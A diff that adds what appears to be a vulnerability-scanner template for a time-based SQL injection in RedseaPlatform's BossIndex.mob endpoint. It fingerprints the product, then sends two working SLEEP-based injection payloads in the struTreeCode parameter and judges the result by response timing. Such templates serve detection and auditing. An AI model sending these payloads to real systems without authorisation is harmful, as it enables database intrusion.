@@ -1,0 +1,56 @@
+id: poc-yaml-hr-soft-bossindex-mob-sqli
+info:
+  name: "RedseaPlatform BossIndex.mob 接口存在 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: RedseaPlatform
+  description: |
+    SQL Injection vulnerability in RedseaPlatform BossIndex.mob endpoint, allowing attackers to execute time-based SQL payloads.
+    The detection involves checking for specific response characteristics, including JSON response structure, duration, and absence of HTML tags.
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "/RedseaPlatform/skins/images/favicon.ico"
+      - type: status
+        status:
+          - 200
+
+  - id: sqli-check
+    method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/BossIndex.mob?method=getNewStaffJoin&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP(5)))ShXk)+AND+%27qmyT%27=%27qmyT"
+      - "{{BaseURL}}/RedseaPlatform/BossIndex.mob?method=getNewStaffJoin&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP(8)))ShXk)+AND+%27qmyT%27=%27qmyT"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"meg\":\"处理成功\""
+          - "\"jsonList\":"
+      - type: word
+        part: header
+        words:
+          - "text/json;charset=UTF-8"
+      - type: regex
+        part: body
+        regex:
+          - "^[^<]*$"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
+      - type: status
+        status:
+          - 200
